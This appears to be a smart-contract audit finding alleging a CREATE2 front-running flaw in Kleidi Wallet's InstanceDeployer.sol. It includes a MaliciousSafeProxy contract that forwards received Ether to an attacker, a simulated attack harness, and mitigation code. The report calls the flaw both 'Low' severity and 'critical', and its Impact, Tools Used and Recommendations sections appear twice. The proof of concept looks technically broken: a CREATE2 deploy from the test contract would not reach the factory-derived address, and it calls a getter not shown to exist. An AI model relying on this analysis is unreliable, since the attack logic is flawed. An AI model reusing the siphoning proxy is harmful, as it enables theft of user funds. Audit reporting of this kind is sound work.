
# Vulnerability Name: Front-Running Vulnerability in InstanceDeployer.sol
**Severity Rating:** Low

## Summary

A critical front-running vulnerability has been identified in the `InstanceDeployer.sol` contract of the Kleidi Wallet project. This vulnerability allows an attacker to pre-deploy a malicious proxy at a predicted address using `CREATE2`, thereby intercepting the deployment process. As a result, the `InstanceDeployer` may interact with the attacker's proxy instead of the intended `SafeProxy`, leading to unauthorized control over the wallet and potential asset theft.

## Vulnerability Details

### **1. Vulnerable Code Segment in InstanceDeployer.sol**

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    bytes32 salt = keccak256(
        abi.encodePacked(keccak256(safeInitdata), creationSalt)
    );
    walletInstance.safe = SafeProxy(
        payable(
            calculateCreate2Address(
                safeProxyFactory,
                SafeProxyFactory(safeProxyFactory).proxyCreationCode(),
                abi.encode(safeProxyLogic),
                salt
            )
        )
    );

    emit SafeCreationFailed(
        msg.sender,
        block.timestamp,
        address(walletInstance.safe),
        safeInitdata,
        creationSalt
    );
}
```

**Explanation:**

- **Function Attempt:** The contract attempts to deploy a new `SafeProxy` using `createProxyWithNonce`.
- **Failure Handling:** If the deployment fails (e.g., due to the address already being occupied), the `catch` block calculates the expected address using `CREATE2` and assigns it to `walletInstance.safe` without verifying the proxy's integrity.
- **Assumption Flaw:** It assumes the proxy at the calculated address is the intended `SafeProxy`, which may not hold true if an attacker has pre-deployed a malicious contract at that address.

### **2. MaliciousSafeProxy Contract**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

contract MaliciousSafeProxy {
    address public owner;
    address public safeProxyLogic;

    constructor(address _logic) {
        owner = msg.sender;
        safeProxyLogic = _logic;
    }

    fallback() external payable {
        // Malicious fallback to intercept any calls
        if (msg.value > 0) {
            payable(owner).transfer(msg.value);
        }
    }

    receive() external payable {}
}
```

**Explanation:**

- **Purpose:** This contract mimics the `SafeProxy` interface but includes a malicious fallback function.
- **Malicious Behavior:** Any Ether sent to this proxy is immediately transferred to the attacker's address (`owner`), enabling unauthorized fund extraction.

### **3. TestEnvironment Contract to Simulate the Attack**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "./InstanceDeployer.sol";
import "./MaliciousSafeProxy.sol";
import "./Safe.sol";
import "./Guard.sol";
import "./TimelockFactory.sol";
import "./Multicall3.sol";

contract TestEnvironment {
    InstanceDeployer public deployer;
    MaliciousSafeProxy public maliciousProxy;
    Safe public safeProxyLogic;
    Guard public guard;
    TimelockFactory public timelockFactory;
    Multicall3 public multicall3;
    SafeProxyFactory public safeProxyFactory;
    bytes public safeInitdata;
    uint256 public creationSalt;

    constructor() {
        // Deploy necessary contracts
        safeProxyFactory = new SafeProxyFactory();
        safeProxyLogic = new Safe();
        guard = new Guard();
        timelockFactory = new TimelockFactory();
        multicall3 = new Multicall3();

        // Initialize InstanceDeployer with the deployed contract addresses
        deployer = new InstanceDeployer(
            address(safeProxyFactory),
            address(safeProxyLogic),
            address(timelockFactory),
            address(guard),
            address(multicall3)
        );

        // Prepare the safeInitdata as per the deployment logic
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        safeInitdata = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners,
            1,
            address(0),
            "",
            address(0),
            address(0),
            0,
            address(0)
        );

        // Calculate the creationSalt as per the deployment logic
        creationSalt = uint256(
            keccak256(
                abi.encode(
                    owners,
                    1,
                    1 days,
                    30 days,
                    address(0),
                    uint128(1 days),
                    new address[](0)
                )
            )
        );
    }

    // Function to simulate the attack
    function simulateFrontRunningAttack() external {
        // Step 1: Attacker deploys MaliciousSafeProxy at the predicted address
        bytes32 salt = keccak256(
            abi.encodePacked(keccak256(safeInitdata), creationSalt)
        );
        maliciousProxy = new MaliciousSafeProxy{salt: bytes32(salt)}(address(safeProxyLogic));

        // Step 2: Attempt to create the system instance
        // This should trigger the catch block, assuming the proxy exists at the calculated address
        deployer.createSystemInstance(
            NewInstance({
                owners: new address[](1),
                threshold: 1,
                recoverySpells: new address[](0),
                timelockParams: DeploymentParams({
                    minDelay: 1 days,
                    expirationPeriod: 30 days,
                    pauser: address(0),
                    pauseDuration: 1 days,
                    hotSigners: new address[](0),
                    contractAddresses: new address[](0),
                    selectors: new bytes4[](0),
                    startIndexes: new uint16[](0),
                    endIndexes: new uint16[](0),
                    datas: new bytes[][](0),
                    salt: bytes32(creationSalt)
                })
            })
        );

        // Step 3: Verify that the malicious proxy is set as the safe
        require(
            address(deployer.safe()) == address(maliciousProxy),
            "Attack failed: SafeProxy was not replaced with MaliciousSafeProxy"
        );
    }

    // Helper function to deposit Ether into the MaliciousSafeProxy
    function depositToMaliciousProxy() external payable {
        require(address(maliciousProxy) != address(0), "Malicious proxy not deployed");
        (bool success, ) = address(maliciousProxy).call{value: msg.value}("");
        require(success, "Deposit failed");
    }

    // Function to check the balance of the attacker (this contract)
    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**Explanation:**

- **Deployment:** Sets up the necessary contracts, including deploying the `InstanceDeployer` with references to `SafeProxyFactory`, `Safe`, `Guard`, `TimelockFactory`, and `Multicall3`.
- **simulateFrontRunningAttack Function:**
  - **Step 1:** Deploys a `MaliciousSafeProxy` at the predicted address using the same `creationSalt` as the legitimate deployment.
  - **Step 2:** Attempts to create the system instance, which fails to deploy the `SafeProxy` since the attacker’s proxy already exists, triggering the `catch` block.
  - **Step 3:** Verifies that the `InstanceDeployer` now points to the malicious proxy, confirming the vulnerability.

### **4. Exploitation Process**

#### **4.1. Deploying MaliciousSafeProxy**

The attacker pre-deploys a `MaliciousSafeProxy` at the predicted address using the same `creationSalt`:

```solidity
bytes32 salt = keccak256(
    abi.encodePacked(keccak256(safeInitdata), creationSalt)
);
maliciousProxy = new MaliciousSafeProxy{salt: bytes32(salt)}(address(safeProxyLogic));
```

**Explanation:**

- **Salt Calculation:** Mirrors the salt used in the legitimate deployment to ensure the proxy is deployed at the expected address.
- **Deployment:** Deploys the malicious proxy, which will intercept any transactions intended for the legitimate `SafeProxy`.

#### **4.2. Triggering the Vulnerability**

When `InstanceDeployer.createSystemInstance` is invoked:

```solidity
deployer.createSystemInstance(
    NewInstance({
        owners: new address[](1),
        threshold: 1,
        recoverySpells: new address[](0),
        timelockParams: DeploymentParams({
            minDelay: 1 days,
            expirationPeriod: 30 days,
            pauser: address(0),
            pauseDuration: 1 days,
            hotSigners: new address[](0),
            contractAddresses: new address[](0),
            selectors: new bytes4[](0),
            startIndexes: new uint16[](0),
            endIndexes: new uint16[](0),
            datas: new bytes[][](0),
            salt: bytes32(creationSalt)
        })
    })
);
```

**Explanation:**

- **Deployment Attempt:** Tries to deploy a new `SafeProxy` using `createProxyWithNonce`.
- **Failure Scenario:** Since the attacker has already deployed a proxy at the predicted address, the deployment fails, triggering the `catch` block.
- **Assumption:** The contract assumes the proxy exists at the calculated address without verifying its integrity.

#### **4.3. Exploiting the Compromised Proxy**

After successful exploitation:

```solidity
require(
    address(deployer.safe()) == address(maliciousProxy),
    "Attack failed: SafeProxy was not replaced with MaliciousSafeProxy"
);
```

**Explanation:**

- **Verification:** Confirms that the `InstanceDeployer` is now interacting with the malicious proxy.
- **Malicious Actions:** The attacker can now perform unauthorized actions, such as stealing funds through the proxy's fallback function.

## Impact

- **Asset Theft:** Attackers can intercept and redirect funds, leading to significant financial losses for users.
- **Unauthorized Control:** Malicious proxies can execute arbitrary transactions, altering wallet configurations or draining assets.
- **Trust Erosion:** Exploitation undermines user trust in the Kleidi Wallet's security mechanisms, potentially harming the project's reputation.
- **Irreversible Changes:** Unauthorized modifications to wallet settings can lead to permanent loss of control and assets.

## Tools Used

- **Foundry**


## Recommendations

To mitigate the identified front-running vulnerability in the `InstanceDeployer.sol` contract, implement the following measures:

### **1. Post-Deployment Verification**

After calculating the expected proxy address using `CREATE2`, verify that the proxy exists and matches the intended `SafeProxy` implementation.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    bytes32 salt = keccak256(
        abi.encodePacked(keccak256(safeInitdata), creationSalt)
    );
    address predictedAddress = calculateCreate2Address(
        safeProxyFactory,
        SafeProxyFactory(safeProxyFactory).proxyCreationCode(),
        abi.encode(safeProxyLogic),
        salt
    );

    // Verify that the proxy exists and matches the expected implementation
    require(
        Address.isContract(predictedAddress),
        "Guard: SafeProxy does not exist at the predicted address"
    );

    // Optional: Verify that the code at the predicted address matches SafeProxy
    bytes32 expectedCodeHash = keccak256(type(SafeProxy).creationCode);
    bytes32 actualCodeHash = keccak256(getCode(predictedAddress));
    require(
        actualCodeHash == expectedCodeHash,
        "Guard: Proxy code mismatch"
    );

    walletInstance.safe = SafeProxy(payable(predictedAddress));

    emit SafeCreationFailed(
        msg.sender,
        block.timestamp,
        address(walletInstance.safe),
        safeInitdata,
        creationSalt
    );
}

// Helper function to retrieve contract code
function getCode(address addr) internal view returns (bytes memory) {
    bytes memory code;
    assembly {
        // Retrieve the size of the code
        let size := extcodesize(addr)
        // Allocate output byte array
        code := mload(0x40)
        // Update free-memory pointer to allocate
        mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
        // Store length in memory
        mstore(code, size)
        // Retrieve code
        extcodecopy(addr, add(code, 0x20), 0, size)
    }
    return code;
}
```

**Explanation:**

- **Contract Verification:** Ensures that the contract at the predicted address exists and matches the expected `SafeProxy` implementation.
- **Code Hash Comparison:** Compares the hash of the deployed contract's bytecode with the expected hash to confirm integrity.
- **Rejection of Mismatches:** If verification fails, the transaction is reverted, preventing interaction with potentially malicious proxies.

### **2. Revert on Deployment Failure**

Instead of proceeding with assumptions when `createProxyWithNonce` fails, revert the entire transaction to prevent unauthorized interactions.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    revert("Guard: SafeProxy deployment failed");
}
```

**Explanation:**

- **Immediate Reversion:** Halts the deployment process if the proxy creation fails, eliminating the opportunity for attackers to exploit the catch block.
- **Security Assurance:** Ensures that only legitimate proxies are used, maintaining the wallet's integrity.

### **3. Implement Atomic Deployment**

Ensure that the deployment and configuration of the `SafeProxy` occur atomically within a single transaction, preventing any intermediate state where an attacker could intervene.

```solidity
function createSystemInstance(NewInstance memory instance)
    external
    returns (SystemInstance memory walletInstance)
{
    // Begin atomic deployment
    // Deploy SafeProxy and Timelock in a single transaction
    // Ensure all steps are completed without external interference
    // ...
}
```

**Explanation:**

- **Single Transaction Execution:** Consolidates all deployment steps into one atomic operation, reducing the window for potential front-running attacks.
- **Consistency:** Maintains the system's state integrity by ensuring that either all deployment steps succeed or none do.

### **4. Utilize Commit-Reveal Schemes**

Implement commit-reveal mechanisms for deployment parameters like `salt` to prevent attackers from predicting and pre-deploying malicious proxies.

```solidity
// Example Commit-Reveal Scheme
bytes32 public deploymentCommit;

function commitDeployment(bytes32 _commit) external onlyAuthorized {
    deploymentCommit = _commit;
}

function revealDeployment(/* parameters */) external onlyAuthorized {
    require(keccak256(abi.encodePacked(/* parameters */)) == deploymentCommit, "Invalid commit");
    // Proceed with deployment
}
```

**Explanation:**

- **Commit Phase:** Securely commit to deployment parameters without revealing them, preventing attackers from predicting future deployments.
- **Reveal Phase:** Later reveal the committed parameters, ensuring that deployment occurs with verified and non-predictable salts.

### **5. Restrict Deployment Access**

Limit who can initiate the deployment process, ensuring that only trusted entities can deploy new instances.

```solidity
modifier onlyAuthorized() {
    require(msg.sender == authorizedAddress, "Caller is not authorized");
    _;
}

function createSystemInstance(NewInstance memory instance)
    external
    onlyAuthorized
    returns (SystemInstance memory walletInstance)
{
    // Deployment logic
}
```

**Explanation:**

- **Access Control:** Ensures that only designated addresses can perform sensitive deployment operations.
- **Security Enforcement:** Reduces the risk of unauthorized or malicious deployments by restricting access.

### **6. Enhanced Error Handling and Logging**

Implement comprehensive error handling and logging to monitor and respond to deployment anomalies effectively.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch Error(string memory reason) {
    emit DeploymentFailed(msg.sender, reason);
    revert("Guard: SafeProxy deployment failed");
} catch {
    emit DeploymentFailed(msg.sender, "Unknown error");
    revert("Guard: SafeProxy deployment failed");
}
```

**Explanation:**

- **Detailed Reverts:** Provides specific error messages based on the failure reason, aiding in debugging and monitoring.
- **Event Emissions:** Logs deployment failures for external monitoring and alerting systems.

## Impact

- **Asset Theft:** Attackers can intercept and redirect funds, leading to significant financial losses for users.
- **Unauthorized Control:** Malicious proxies can execute arbitrary transactions, altering wallet configurations or draining assets.
- **Trust Erosion:** Exploitation undermines user trust in the Kleidi Wallet's security mechanisms, potentially harming the project's reputation.
- **Irreversible Changes:** Unauthorized modifications to wallet settings can lead to permanent loss of control and assets.

## Tools Used

- **Solidity:** Programming language for writing smart contracts.
- **Foundry:** A development toolchain for Ethereum smart contracts used for testing and deployment.
- **VS Code:** Code editor for writing and managing smart contract code.
- **OpenZeppelin Contracts:** Utilized for standard contract implementations and security.
- **CREATE2 Opcode:** Used for deploying contracts at deterministic addresses, which is central to the identified vulnerability.

## Recommendations

To mitigate the identified front-running vulnerability in the `InstanceDeployer.sol` contract, implement the following changes:

### **1. Post-Deployment Verification**

After calculating the expected proxy address using `CREATE2`, verify that the proxy exists and matches the intended `SafeProxy` implementation.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    bytes32 salt = keccak256(
        abi.encodePacked(keccak256(safeInitdata), creationSalt)
    );
    address predictedAddress = calculateCreate2Address(
        safeProxyFactory,
        SafeProxyFactory(safeProxyFactory).proxyCreationCode(),
        abi.encode(safeProxyLogic),
        salt
    );

    // Verify that the proxy exists and matches the expected implementation
    require(
        Address.isContract(predictedAddress),
        "Guard: SafeProxy does not exist at the predicted address"
    );

    // Optional: Verify that the code at the predicted address matches SafeProxy
    bytes32 expectedCodeHash = keccak256(type(SafeProxy).creationCode);
    bytes32 actualCodeHash = keccak256(getCode(predictedAddress));
    require(
        actualCodeHash == expectedCodeHash,
        "Guard: Proxy code mismatch"
    );

    walletInstance.safe = SafeProxy(payable(predictedAddress));

    emit SafeCreationFailed(
        msg.sender,
        block.timestamp,
        address(walletInstance.safe),
        safeInitdata,
        creationSalt
    );
}

// Helper function to retrieve contract code
function getCode(address addr) internal view returns (bytes memory) {
    bytes memory code;
    assembly {
        // Retrieve the size of the code
        let size := extcodesize(addr)
        // Allocate output byte array
        code := mload(0x40)
        // Update free-memory pointer to allocate
        mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))
        // Store length in memory
        mstore(code, size)
        // Retrieve code
        extcodecopy(addr, add(code, 0x20), 0, size)
    }
    return code;
}
```

**Explanation:**

- **Contract Verification:** Ensures that the contract at the predicted address exists and matches the expected `SafeProxy` implementation.
- **Code Hash Comparison:** Compares the hash of the deployed contract's bytecode with the expected hash to confirm integrity.
- **Rejection of Mismatches:** If verification fails, the transaction is reverted, preventing interaction with potentially malicious proxies.

### **2. Revert Instead of Proceeding on Failure**

Instead of proceeding with assumptions when `createProxyWithNonce` fails, revert the entire transaction to prevent unauthorized interactions.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch {
    revert("Guard: SafeProxy deployment failed");
}
```

**Explanation:**

- **Immediate Reversion:** Halts the deployment process if the proxy creation fails, eliminating the opportunity for attackers to exploit the catch block.
- **Security Assurance:** Ensures that only legitimate proxies are used, maintaining the wallet's integrity.

### **3. Implement Atomic Deployment**

Ensure that the deployment and configuration of the `SafeProxy` occur atomically within a single transaction, preventing any intermediate state where an attacker could intervene.

```solidity
function createSystemInstance(NewInstance memory instance)
    external
    returns (SystemInstance memory walletInstance)
{
    // Begin atomic deployment
    // Deploy SafeProxy and Timelock in a single transaction
    // Ensure all steps are completed without external interference
    // ...
}
```

**Explanation:**

- **Single Transaction Execution:** Consolidates all deployment steps into one atomic operation, reducing the window for potential front-running attacks.
- **Consistency:** Maintains the system's state integrity by ensuring that either all deployment steps succeed or none do.

### **4. Use Commit-Reveal Schemes**

Implement commit-reveal mechanisms for deployment parameters like `salt` to prevent attackers from predicting and pre-deploying malicious proxies.

```solidity
// Example Commit-Reveal Scheme
bytes32 public deploymentCommit;

function commitDeployment(bytes32 _commit) external onlyAuthorized {
    deploymentCommit = _commit;
}

function revealDeployment(/* parameters */) external onlyAuthorized {
    require(keccak256(abi.encodePacked(/* parameters */)) == deploymentCommit, "Invalid commit");
    // Proceed with deployment
}
```

**Explanation:**

- **Commit Phase:** Securely commit to deployment parameters without revealing them, preventing attackers from predicting future deployments.
- **Reveal Phase:** Later reveal the committed parameters, ensuring that deployment occurs with verified and non-predictable salts.

### **5. Restrict Deployment Access**

Limit who can initiate the deployment process, ensuring that only trusted entities can deploy new instances.

```solidity
modifier onlyAuthorized() {
    require(msg.sender == authorizedAddress, "Caller is not authorized");
    _;
}

function createSystemInstance(NewInstance memory instance)
    external
    onlyAuthorized
    returns (SystemInstance memory walletInstance)
{
    // Deployment logic
}
```

**Explanation:**

- **Access Control:** Ensures that only designated addresses can perform sensitive deployment operations.
- **Security Enforcement:** Reduces the risk of unauthorized or malicious deployments by restricting access.

### **6. Enhanced Error Handling and Logging**

Implement comprehensive error handling and logging to monitor and respond to deployment anomalies effectively.

```solidity
try SafeProxyFactory(safeProxyFactory).createProxyWithNonce(
    safeProxyLogic, safeInitdata, creationSalt
) returns (SafeProxy safeProxy) {
    walletInstance.safe = safeProxy;
} catch Error(string memory reason) {
    emit DeploymentFailed(msg.sender, reason);
    revert("Guard: SafeProxy deployment failed");
} catch {
    emit DeploymentFailed(msg.sender, "Unknown error");
    revert("Guard: SafeProxy deployment failed");
}
```

**Explanation:**

- **Detailed Reverts:** Provides specific error messages based on the failure reason, aiding in debugging and monitoring.
- **Event Emissions:** Logs deployment failures for external monitoring and alerting systems.

Implementing these recommendations will significantly enhance the security of the `InstanceDeployer.sol` contract, mitigating the identified front-running vulnerability and safeguarding user assets.
